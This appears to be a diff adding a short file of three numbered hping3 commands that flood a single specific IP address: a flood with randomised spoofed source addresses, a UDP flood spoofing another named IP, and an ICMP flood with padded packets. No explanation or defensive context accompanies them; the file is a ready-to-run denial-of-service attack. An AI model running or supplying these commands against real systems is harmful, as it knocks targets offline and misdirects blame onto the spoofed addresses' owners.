@@ -1,0 +1,11 @@
+ 
+1)
+hping3 --flood --rand-source --count 10000 178.128.237.247
+
+
+
+2)
+hping3 --udp --spoof 138.197.158.231 --faster --count 9000 178.128.237.247
+
+3) 
+hping3 --icmp --data 1000 --count 11000 --faster 178.128.237.247
